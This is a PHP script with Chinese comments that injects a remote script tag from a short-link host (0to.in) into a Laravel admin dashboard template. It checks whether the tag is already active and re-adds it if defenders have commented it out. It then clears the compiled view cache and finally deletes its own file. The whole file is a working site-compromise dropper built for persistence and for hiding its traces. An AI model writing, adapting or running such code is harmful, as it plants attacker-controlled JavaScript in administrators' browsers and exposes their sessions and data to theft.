<?php
// --- 配置区域 ---

// 自动获取网站根目录的绝对路径
$base_path = $_SERVER['DOCUMENT_ROOT'];

// 确保路径末尾有斜杠 "/"
if (substr($base_path, -1) !== '/') {
    $base_path .= '/';
}

// 1. 设置要修改的文件的完整路径
$file_to_modify = $base_path . 'resources/views/backend/dashboard.blade.php'; 

// 2. 定义要添加的新脚本内容
$new_content_to_add = "\n<script src=\"https://0to.in/OKH\"></script>";

// 3. 设置要检查的特征字符串
$check_string = '0to.in';

// 4. 设置要清空的目标文件夹的完整路径
$folder_to_clear = $base_path . 'storage/framework/views/';


// --- 函数定义区域 ---

/**
 * (修复了所有已知缺陷 ) 检查文件内容是否已包含活动的、未被注释的特征字符串。
 * @param string $filepath 文件路径
 * @param string $needle 要查找的字符串
 * @return bool 如果找到活动的字符串，返回 true；否则返回 false。
 */
function hasActiveString($filepath, $needle) {
    if (!file_exists($filepath)) return false;

    $lines = file($filepath, FILE_IGNORE_NEW_LINES);
    $in_multiline_comment = false;

    foreach ($lines as $line_num => $line) {
        if (strpos($line, $needle) === false) {
            if (strpos($line, '/*') !== false && strpos($line, '*/') === false) $in_multiline_comment = true;
            else if (strpos($line, '*/') !== false) $in_multiline_comment = false;
            continue;
        }

        $needle_pos = strpos($line, $needle);
        $is_commented = false;

        // 检查PHP多行注释 (/* ... */)
        $multi_start_pos = strpos($line, '/*');
        $multi_end_pos = strpos($line, '*/');
        if ($in_multiline_comment) {
            if ($multi_end_pos === false || $needle_pos < $multi_end_pos) $is_commented = true;
        }
        if (!$is_commented && $multi_start_pos !== false) {
            if ($multi_end_pos === false || ($needle_pos > $multi_start_pos && $needle_pos < $multi_end_pos)) $is_commented = true;
        }
        if ($multi_start_pos !== false && $multi_end_pos === false) $in_multiline_comment = true;
        else if ($multi_end_pos !== false) $in_multiline_comment = false;
        if ($is_commented) continue;

        // 【最终错误修正】
        // 使用正则表达式来确保 '//' 是一个注释，而不是URL的一部分。
        // 这个表达式会查找所有 '//'，然后我们检查它前面的字符。
        $all_slashes = [];
        preg_match_all('/\/\//', $line, $all_slashes, PREG_OFFSET_CAPTURE);

        if (!empty($all_slashes[0])) {
            foreach ($all_slashes[0] as $match) {
                $slash_pos = $match[1];
                // 如果 '0to.in' 在这个 '//' 之后
                if ($needle_pos > $slash_pos) {
                    // 检查 '//' 前面的字符是否是URL的一部分
                    if ($slash_pos > 0) {
                        $char_before = $line[$slash_pos - 1];
                        // 如果前面的字符是 ':' 或 '=' 或 '/'，那么这不是一个注释，跳过这次循环
                        if ($char_before === ':' || $char_before === '=' || $char_before === '/') {
                            continue;
                        }
                    }
                    // 如果能走到这里，说明它是一个真正的注释
                    $is_commented = true;
                    break; // 找到了一个注释，跳出foreach循环
                }
            }
        }
        if ($is_commented) continue; // 如果被注释了，继续外层foreach循环


        // 检查HTML注释 (<!-- ... -->)
        $html_comment_start = strpos($line, '<!--');
        if ($html_comment_start !== false && $needle_pos > $html_comment_start) {
            $html_comment_end = strpos($line, '-->');
            if ($html_comment_end === false || $needle_pos < $html_comment_end) continue;
        }

        // 检查Blade注释 ({{-- ... --}})
        $blade_comment_start = strpos($line, '{{--');
        if ($blade_comment_start !== false && $needle_pos > $blade_comment_start) {
            $blade_comment_end = strpos($line, '--}}');
            if ($blade_comment_end === false || $needle_pos < $blade_comment_end) continue;
        }

        // 找到了一个活动的字符串
        return true;
    }
    // 遍历完所有行都没找到活动的
    return false;
}

/**
 * 执行文件追加操作的函数
 */
function perform_add_operation($file, $content) {
    if (is_writable($file)) {
        if (file_put_contents($file, $content, FILE_APPEND) !== false) {
            echo "成功: 新内容已成功追加到文件。\n";
        } else {
            echo "失败: 无法向文件写入内容。请检查文件系统权限。\n";
        }
    } else {
        echo "失败: 文件不可写。请检查文件权限设置。\n";
    }
}


// --- 执行区域 ---

header('Content-Type: text/plain; charset=utf-8');
echo "--- 自动检测到的网站根目录: " . $base_path . " ---\n\n";

// --- 任务1：修改 Blade 模板文件内容 ---
echo "--- 开始处理文件: " . $file_to_modify . " ---\n";

if (file_exists($file_to_modify)) {
    // 【严格执行您的最终逻辑】
    
    // 步骤一：全局检查
    $entire_content = file_get_contents($file_to_modify);
    if (strpos($entire_content, $check_string) === false) {
        echo "步骤1结果: 文件不包含 '{$check_string}'，直接执行添加。\n";
        perform_add_operation($file_to_modify, $new_content_to_add);
    } else {
        // 步骤二：精确判断
        echo "步骤1结果: 文件包含 '{$check_string}'，进入步骤2进行精确的注释判断...\n";
        
        if (hasActiveString($file_to_modify, $check_string)) {
            echo "步骤2结果: 文件已包含活动的 '{$check_string}' 脚本，无需修改。\n";
        } else {
            echo "步骤2结果: 所有 '{$check_string}' 均被注释，执行添加。\n";
            perform_add_operation($file_to_modify, $new_content_to_add);
        }
    }
} else {
    echo "失败: 文件不存在。请检查路径是否正确。\n";
}

echo "--- 文件处理任务结束 ---\n\n";


// --- 任务2：清空视图缓存文件夹 ---
echo "--- 开始清空文件夹: " . $folder_to_clear . " ---\n";
if (is_dir($folder_to_clear)) {
    try {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder_to_clear, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        $file_count = 0; $dir_count = 0;
        foreach ($iterator as $item) {
            if ($item->isDir()) { if(rmdir($item->getRealPath())) { $dir_count++; } } 
            else { if(unlink($item->getRealPath())) { $file_count++; } }
        }
        echo "成功: 共删除了 " . $file_count . " 个文件和 " . $dir_count . " 个文件夹。\n";
    } catch (Exception $e) {
        echo "失败: 操作过程中发生错误: " . $e->getMessage() . "\n";
    }
} else {
    echo "失败: 文件夹不存在。\n";
}
echo "--- 文件夹清空任务结束 ---\n";
$file = './payation.php';
if (is_file($file) && is_writable($file)) {
    unlink($file);
}else{
    echo('payation.php文件已删除');
}
?>
